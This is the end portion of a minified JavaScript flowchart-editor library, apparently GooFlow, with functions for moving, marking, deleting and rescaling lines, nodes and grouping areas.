this.$lineData[t].M,this.$lineMove.hide().removeData("type").removeData("tid"),!(a=calcStartEnd(this.$nodeData[s],this.$nodeData[r],this.$scale)))return;this.$draw.removeChild(this.$lineDom[t]),this.$lineDom[t]=GooFlow.prototype.drawLine(t,a.start,a.end,this.$lineData[t].marked,this.$lineData[t].dash,this.$scale),this.$draw.appendChild(this.$lineDom[t]),""===GooFlow.prototype.useSVG?(this.$lineDom[t].childNodes[1].innerHTML=this.$lineData[t].name,this.$lineDom[t].childNodes[1].style.left=((a.end[0]-a.start[0])*(a.end[0]>a.start[0]?1:-1)-this.$lineDom[t].childNodes[1].offsetWidth)/2+4):this.$lineDom[t].childNodes[2].textContent=this.$lineData[t].name}this.$focus===t&&this.focusItem(t),this.$editable&&(this.$lineData[t].alt=!0)}},setLineM:function(t,e,o){if(!this.$lineData[t]||e<0||!this.$lineData[t].type||"sl"===this.$lineData[t].type)return!1;if("function"==typeof this.onLineMove&&!1===this.onLineMove(t,e))return!1;if(this.$undoStack&&!o){var i=[t,this.$lineData[t].M];this.pushOper("setLineM",i)}var a=this.$lineData[t].from,s=this.$lineData[t].to;this.$lineData[t].M=e;var r=calcPolyPoints(this.$nodeData[a],this.$nodeData[s],this.$lineData[t].type,this.$lineData[t].M,this.$scale);if(this.$draw.removeChild(this.$lineDom[t]),this.$lineDom[t]=GooFlow.prototype.drawPoly(t,r.start,r.m1,r.m2,r.end,this.$lineData[t].marked,this.$lineData[t].dash,this.$scale),this.$draw.appendChild(this.$lineDom[t]),""===GooFlow.prototype.useSVG){this.$lineDom[t].childNodes[1].innerHTML=this.$lineData[t].name;var n=r.start[0]>r.end[0]?r.end[0]:r.start[0];n>r.m2[0]&&(n=r.m2[0]),n>r.m1[0]&&(n=r.m1[0]),this.$lineDom[t].childNodes[1].style.left=(r.m2[0]+r.m1[0])/2-n-this.$lineDom[t].childNodes[1].offsetWidth/2+4,(n=r.start[1]>r.end[1]?r.end[1]:r.start[1])>r.m2[1]&&(n=r.m2[1]),n>r.m1[1]&&(n=r.m1[1]),this.$lineDom[t].childNodes[1].style.top=(r.m2[1]+r.m1[1])/2-n-this.$lineDom[t].childNodes[1].offsetHeight/2-4}else this.$lineDom[t].childNodes[2].textContent=this.$lineData[t].name;this.$editable&&(this.$lineData[t].alt=!0)},delLine:function(t,e){if(this.$lineData[t]&&(!1===e||"function"!=typeof this.onItemDel||!1!==this.onItemDel(t,"node"))){if(this.$undoStack){var o=[t,this.$lineData[t]];this.pushOper("addLine",o)}this.$draw.removeChild(this.$lineDom[t]),delete this.$lineData[t],delete this.$lineDom[t],this.$focus===t&&(this.$focus=""),--this.$lineCount,this.$editable&&(this.$deletedItem[t]="line",this.$mpFrom.hide().removeData("p"),this.$mpTo.hide().removeData("p")),this.$lineOper&&this.$lineOper.hide().removeData("tid")}},moveLinePoints:function(t,e,o,i){if(e!==o&&t&&this.$lineData[t]){for(var a in null!=e&&""!==e||(e=this.$lineData[t].from),null!=o&&""!==o||(o=this.$lineData[t].to),this.$lineData)if(e===this.$lineData[a].from&&o===this.$lineData[a].to)return;if("function"!=typeof this.onLinePointMove||!1!==this.onLinePointMove(t,e,o)){if(this.$undoStack&&!i){var s=[t,this.$lineData[t].from,this.$lineData[t].to];this.pushOper("moveLinePoints",s)}null!=e&&""!==e&&(this.$lineData[t].from=e),null!=o&&""!==o&&(this.$lineData[t].to=o),this.$draw.removeChild(this.$lineDom[t]),this.addLineDom(t,this.$lineData[t]),this.$editable&&(this.$lineData[t].alt=!0)}}},markItem:function(t,e,o){if("node"===e){if(!this.$nodeData[t])return;if("function"==typeof this.onItemMark&&!1===this.onItemMark(t,"node",o))return;this.$nodeData[t].marked=o||!1,o?this.$nodeDom[t].addClass("item_mark").css("border-color",GooFlow.color.mark):(this.$nodeDom[t].removeClass("item_mark"),t!==this.$focus&&this.$nodeDom[t].css("border-color","transparent"))}else if("line"===e){if(!this.$lineData[t])return;if(null!=this.onItemMark&&!this.onItemMark(t,"line",o))return;this.$lineData[t].marked=o||!1,""!==GooFlow.prototype.useSVG?o?(this.$lineDom[t].childNodes[1].setAttribute("stroke",GooFlow.color.mark),this.$lineDom[t].childNodes[1].setAttribute("marker-end","url(#arrow2)"),this.$lineDom[t].childNodes[1].setAttribute("stroke-width",2.4)):(this.$lineDom[t].childNodes[1].setAttribute("stroke",GooFlow.color.line),this.$lineDom[t].childNodes[1].setAttribute("marker-end","url(#arrow1)"),this.$lineDom[t].childNodes[1].setAttribute("stroke-width",1.4)):o?(this.$lineDom[t].strokeColor=GooFlow.color.mark,this.$lineDom[t].strokeWeight="2.4"):(this.$lineDom[t].strokeColor=GooFlow.color.line,this.$lineDom[t].strokeWeight="1.2")}if(this.$undoStack){var i=[t,e,!o];this.pushOper("markItem",i)}},_areaFixNodes:function(t){var e=this.$areaData[t];for(var o in this.$nodeData){var i=this.$nodeData[o];i.left>=e.left&&i.left<e.left+e.width&&i.top>=e.top&&i.top<e.top+e.height?i.areaId=t:i.areaId&&i.areaId===t&&this._node2Area(o)}},moveArea:function(t,e,o){if(this.$areaData[t]&&(null==this.onItemMove||this.onItemMove(t,"area",e,o))){if(this.$undoStack){var i=[t,this.$areaData[t].left,this.$areaData[t].top];this.pushOper("moveArea",i)}e<0&&(e=0),o<0&&(o=0),$("#"+t).css({left:e*this.$scale+"px",top:o*this.$scale+"px"}),this.$areaData[t].left=e,this.$areaData[t].top=o,this.$editable&&(this.$areaData[t].alt=!0,this._areaFixNodes(t))}},delArea:function(t,e){if(this.$areaData[t]){if(this.$undoStack){var o=[t,this.$areaData[t]];this.pushOper("addArea",o)}if((!1===e||"function"!=typeof this.onItemDel||!1!==this.onItemDel(t,"node"))&&(delete this.$areaData[t],this.$areaDom[t].remove(),delete this.$areaDom[t],--this.$areaCount,this.$editable)){for(var i in this.$nodeData){var a=this.$nodeData[i];a.areaId===t&&delete a.areaId}this.$deletedItem[t]="area"}}},setAreaColor:function(t,e){if(this.$areaData[t]){if(this.$undoStack){var o=[t,this.$areaData[t].color];this.pushOper("setAreaColor",o)}"red"!==e&&"yellow"!==e&&"blue"!==e&&"green"!==e||(this.$areaDom[t].removeClass("area_"+this.$areaData[t].color).addClass("area_"+e),this.$areaData[t].color=e),this.$editable&&(this.$areaData[t].alt=!0)}},resizeArea:function(t,e,o){if(this.$areaData[t]&&("function"!=typeof this.onItemResize||!1!==this.onItemResize(t,"area",e,o))){if(this.$undoStack){var i=[t,this.$areaData[t].width,this.$areaData[t].height];this.pushOper("resizeArea",i)}this.$areaDom[t].children(".bg").css({width:e*this.$scale+"px",height:o*this.$scale+"px"}),e=this.$areaDom[t].outerWidth(),o=this.$areaDom[t].outerHeight(),this.$areaDom[t].children("bg").css({width:e+"px",height:o+"px"}),this.$areaData[t].width=e,this.$areaData[t].height=o,this.$editable&&(this.$areaData[t].alt=!0,this._areaFixNodes(t))}},addArea:function(t,e){"function"==typeof this.onItemAdd&&!1===this.onItemAdd(t,"area",e)||(this.$undoStack&&this.$editable&&this.pushOper("delArea",[t]),this.$areaDom[t]=$("<div id='"+t+"' class='GooFlow_area area_"+e.color+"' style='top:"+e.top*this.$scale+"px;left:"+e.left*this.$scale+"px'><div class='bg' style='width:"+e.width*this.$scale+"px;height:"+e.height*this.$scale+"px'></div><label>"+e.name+"</label><i></i><div><div class='rs_bottom'></div><div class='rs_right'></div><div class='rs_rb'></div><div class='rs_close'></div></div></div>"),this.$areaData[t]=e,this.$group.append(this.$areaDom[t]),"group"!==this.$nowType&&this.$areaDom[t].children("div:eq(1)").css("display","none"),++this.$areaCount,this.$editable&&(this.$areaData[t].alt=!0,this._areaFixNodes(t),this.$deletedItem[t]&&delete this.$deletedItem[t]))},reinitSize:function(t,e){var o=t||this.$bgDiv.width(),i=e||this.$bgDiv.height();this.$bgDiv.css({height:i+"px",width:o+"px"});var a=0,s=8;null!=this.$head&&(a=26,s=5),null!=this.$tool&&(this.$tool.css({height:i-a-s+"px"}),o-=31),o-=9,i=i-a-(null!=this.$head?5:8),this.$workArea.width()>o&&(o=this.$workArea.width()),this.$workArea.height()>i&&(i=this.$workArea.height()),this.$workArea.css({height:i+"px",width:o+"px"}),""===GooFlow.prototype.useSVG&&(this.$draw.coordsize=o+","+i),this.$draw.style.width=o+"px",this.$draw.style.height=i+"px",null!=this.$group&&this.$group.css({height:i+"px",width:o+"px"})},resetScale:function(s){if(s?s<.5?s=.5:4<s&&(s=4):s=1,this.$scale!==s){var r=this.$scale/(this.$scale=s),n=0,l=0,h={};this.blurItem(),n=this.$workArea.width()/r,l=this.$workArea.height()/r,this.$workArea.css({height:l+"px",width:n+"px"}),""!==GooFlow.prototype.useSVG||(this.$draw.coordsize=n+","+l),this.$draw.style.width=n+"px",this.$draw.style.height=l+"px",null!=this.$group&&this.$group.css({height:l+"px",width:n+"px"});var d=-1<navigator.userAgent.toLowerCase().indexOf("webkit");this.$workArea.children(".GooFlow_item").each(function(){var t=$(this);h=t.position(),t.css({left:h.left/r+"px",top:h.top/r+"px"}),t=t.children("table"),n=t.outerWidth()/r,l=t.outerHeight()/r,t.css({width:n+"px",height:l+"px"});var e=18*s;t.find("td[class='ico']").css({width:e+"px"});var o={};if(e<12&&d?(o.width="18px",o.height="18px",o["font-size"]="18px",o.transform="scale("+e/18+")",o.margin=-(18-e)/2+"px"):(o.width=e+"px",o.height=e+"px",o["font-size"]=e+"px",o.transform="none",o.margin="0px auto"),t.find("td[class='ico']").children("i").css(o),e=14*s,1===t.parent().find(".span").length)t.parent().css("border-radius",n/2+"px"),(t=t.parent().find(".span")).css({"font-size":e+"px"});else{if(t=t.find("td:eq(1) div"),o={},e<12&&d){o["font-size"]="14px",o.transform="scale("+e/14+")";var i=(n/s-18-(n-18*s))/2,a=(l/s-l)/2;o.margin=-a+"px "+-i+"px"}else o.transform="none",o["font-size"]=e+"px",o.margin="0px";t.css(o)}});var e=16*s+2;for(var t in this.$group.children(".GooFlow_area").each(function(){var t=$(this);h=t.position(),t.css({left:h.left/r+"px",top:h.top/r+"px"}),t=t.children("div:eq(0)"),n=t.outerWidth()/r,l=t.outerHeight()/r,t.css({width:n+"px",height:l+"px"}),t.next("label").css({"font-size":14*s+"px",left:e+3+"px"}).next("i").css({"font-size":e-2+"px",width:e+"px",height:e+"px","line-height":e+"px"})}),this.$lineDom)this.$draw.removeChild(this.$lineDom[t]),delete this.$lineDom[t];for(var o in this.$lineData)this.addLineDom(o,this.$lineData[o])}}},GooFlow.color={font:"#15428B",node:"#C0CCDA",line:"#1D8CE0",lineFont:"#777",mark:"#ff8800",mix:"#B6F700",mixFont:"#777"},GooFlow.remarks={headBtns:{},toolBtns:{},extendRight:void 0,extendBottom:void 0},GooFlow.init=function(t,e){return new GooFlow(t,e)},GooFlow.setColors=function(t){$.extend(GooFlow.color,t)},GooFlow.extend=function(t){for(var e in t)GooFlow.prototype[e]=t[e]},$.extend({createGooFlow:function(t,e){return new GooFlow(t,e)}}),GooFlow});
//# sourceMappingURL=maps/GooFlow.min.js.map
